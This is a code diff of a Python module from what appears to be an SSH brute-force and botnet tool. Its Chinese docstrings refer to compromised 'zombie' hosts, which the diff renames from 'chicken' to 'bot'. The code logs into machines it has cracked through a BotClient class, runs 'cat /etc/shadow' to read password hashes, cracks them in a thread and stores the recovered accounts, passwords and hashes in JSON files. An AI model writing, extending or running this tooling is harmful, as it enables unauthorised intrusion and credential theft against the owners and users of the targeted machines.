@@ -7,7 +7,7 @@ import json
 import global_var as gv
 import threading
 import time
-from brute import bruteSSH, loginSSH, bruteUnixPasswd
+from brute import bruteSSH, botNet, bruteUnixPasswd
 
 
 def brute(host, user, dictionary, *, connections):
@@ -28,7 +28,7 @@ def brute(host, user, dictionary, *, connections):
     return brute_ret
 
 
-def crack_chicken_unix_passwd(ip, passwd_file_info):
+def crack_bot_unix_passwd(ip, passwd_file_info):
     if passwd_file_info is None or passwd_file_info == '':
         return None
 
@@ -47,42 +47,44 @@ def crack_chicken_unix_passwd(ip, passwd_file_info):
                 pass_bruteinfo['account'][passwd_info['user']]['password'] = passwd_info['password']
                 pass_bruteinfo['account'][passwd_info['user']]['hash'] = line
 
-        save_info(mode='crack_unix_passwd', filename=gv.CHICKEN_PATH + gv.chicken_info_file, info=pass_bruteinfo, ip=ip)
+        save_info(mode='crack_unix_passwd', filename=gv.BOT_PATH + gv.bot_info_file, info=pass_bruteinfo, ip=ip)
 
 
-def get_unix_passwdfile(handle):
+def get_unix_passwdfile(bot):
     cmd_getpass = 'cat /etc/shadow'
-    passwd_file_info = loginSSH.send_command(handle, cmd_getpass)
+    passwd_file_info = bot.send_command(cmd_getpass)
     return passwd_file_info
 
 
-def standard_operate_chicken(handle, host):
+def standard_operate_bot(bot, host):
     """肉鸡标准操作
 
-    :param handle:登录句柄 pxssh
-    :param host:目标主机ip地址
+    :param bot: class
+    :param host: host
     :return:
     """
-    if not handle:
+    if bot.connected is False:
         return
 
     # 破解unix密码
-    passwd_file_info = get_unix_passwdfile(handle)
-    t = threading.Thread(target=crack_chicken_unix_passwd, args=(host, passwd_file_info))
-    loginSSH.close_connection(handle)
+    passwd_file_info = get_unix_passwdfile(bot)
+    t = threading.Thread(target=crack_bot_unix_passwd, args=(host, passwd_file_info))
+    bot.close_connection()
     t.start()
     t.join()
 
 
-def operate_chicken(brute_info):
+def operate_bot(brute_info):
     """登录肉鸡，并操作
 
-    :param brute_info:登录信息{'host': '1.2.3.4', 'user': 'root', 'type': 'password', 'key': None}
+    :param brute_info:登录信息{'host': '1.2.3.4', 'user': 'root', 'ssh_type': 'password', 'key': None}
     :return:
     """
-    handle = loginSSH.ret_login_handle(brute_info)
-    if handle:
-        standard_operate_chicken(handle, brute_info['ip'])
+    brute_info.pop('time')
+    bot = botNet.BotClient(**brute_info)
+    bot.connect()
+    if bot.connected is True:
+        standard_operate_bot(bot, brute_info['host'])
 
 
 def save_info(mode, filename, info, **kw):
@@ -101,17 +103,17 @@ def save_info(mode, filename, info, **kw):
     elif mode == 'crack_unix_passwd':
         # 需要加锁
         if os.path.exists(filename):
-            chicken_info = json.load(open(filename, 'r'))
+            bot_info = json.load(open(filename, 'r'))
         else:
-            chicken_info = {}
+            bot_info = {}
         if 'ip' in kw:
-            chicken_info[info['ip']] = info
-        json.dump(chicken_info, open(filename, 'w'), indent=4)
+            bot_info[info['ip']] = info
+        json.dump(bot_info, open(filename, 'w'), indent=4)
     else:
         return None
 
 
-def read_files(filename, path=gv.CHICKEN_PATH):
+def read_files(filename, path=gv.BOT_PATH):
     """读取原破解结果
 
     :param filename:
@@ -119,11 +121,11 @@ def read_files(filename, path=gv.CHICKEN_PATH):
     :return:
     """
     if os.path.exists(path):
-        chicken_info = json.load(open(gv.CHICKEN_PATH + filename, 'r'))
-        return chicken_info
+        bot_info = json.load(open(gv.BOT_PATH + filename, 'r'))
+        return bot_info
 
 
 if __name__ == '__main__':
-    mess = json.load(open(gv.CHICKEN_PATH + gv.chicken_info_file, 'r'))
-    # mess = read_files(CHICKEN_FILE)
+    mess = json.load(open(gv.BOT_PATH + gv.bot_info_file, 'r'))
+    # mess = read_files(bot_FILE)
     print(json.dumps(mess, indent=4))
